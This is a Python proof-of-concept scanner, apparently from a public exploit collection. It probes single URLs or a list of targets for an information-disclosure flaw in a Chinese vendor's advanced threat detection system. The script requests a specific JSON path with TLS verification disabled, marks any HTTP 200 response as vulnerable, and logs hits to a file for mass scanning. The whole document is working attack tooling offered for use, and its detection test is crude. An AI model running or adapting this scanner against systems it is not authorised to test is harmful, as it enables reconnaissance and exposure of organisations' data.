import requests
import argparse
import urllib3
import sys
import json

urllib3.disable_warnings()


def title():
    print("""
                               中安网脉高级威胁检测系统信息泄露漏洞
                      use: python3  中安网脉高级威胁检测系统信息泄露漏洞.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        try:
            requests.packages.urllib3.disable_warnings()
            web = requests.get(self.url + "/atd-translation/i18n.json", verify=False)
            # py = json(web)
            if web.status_code == 200:
                print(self.url + "存在中安网脉高级威胁检测系统信息泄露漏洞！")
                with open("中安网脉高级威胁检测系统信息泄露漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url + "\n")
            if web.status_code == 404:
                print("页面404")
            if web.status_code == 302:
                print("页面跳转")
            if web.status_code == 403:
                print("waf拦截")
        except requests.exceptions.ConnectionError:
            print("链接错误")


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="中安网脉高级威胁检测系统信息泄露漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 中安网脉高级威胁检测系统信息泄露漏洞.py -u http://127.0.0.1\neg2:>>>python3 中安网脉高级威胁检测系统信息泄露漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
